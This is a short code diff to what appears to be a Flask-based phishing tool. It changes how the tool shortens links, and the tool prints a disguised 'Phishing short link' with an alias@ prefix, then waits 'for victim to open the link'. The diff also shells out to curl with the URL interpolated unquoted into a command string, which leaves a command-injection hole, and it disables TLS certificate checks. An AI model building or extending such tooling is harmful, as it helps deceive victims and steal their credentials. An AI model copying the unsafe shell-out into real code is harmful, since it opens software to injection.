@@ -3,7 +3,7 @@ try:
    from flask import Flask, request, render_template , redirect
    import argparse
    from waitress import serve
-   import os, socket, os.path
+   import os, socket, os.path, subprocess
    from banner import *
    os.system('cls' if os.name == 'nt' else 'clear')
    PrintBanner()
@@ -89,17 +89,21 @@ try:
       try:
          import requests
          def url_ok(url):
-            r = requests.head(url)
-            if r.status_code == 200:
+            try:
+               requests.get(url, verify=False, timeout=5)
                return True
-            else:
-               return False   
+            except:
+               return False  
+
          if url_ok("https://is.gd"):
             shortner = f'https://is.gd/create.php?format=simple&url={url}'
          else:
             shortner = f'https://da.gd/s/?url={url}'
-         x = requests.get(shortner)
-         r = x.text
+         if os.name == "posix":
+            r = subprocess.getoutput(f"curl -s https://da.gd/s/?url={url}")
+         else:
+            x = requests.get(shortner)
+            r = x.text
          print(" [ * ] Phishing short link: "+alias+"@"+r.replace("\n","").replace("https://",""))
          print('\n [ * ] Waiting for victim to open the link...')
       except:
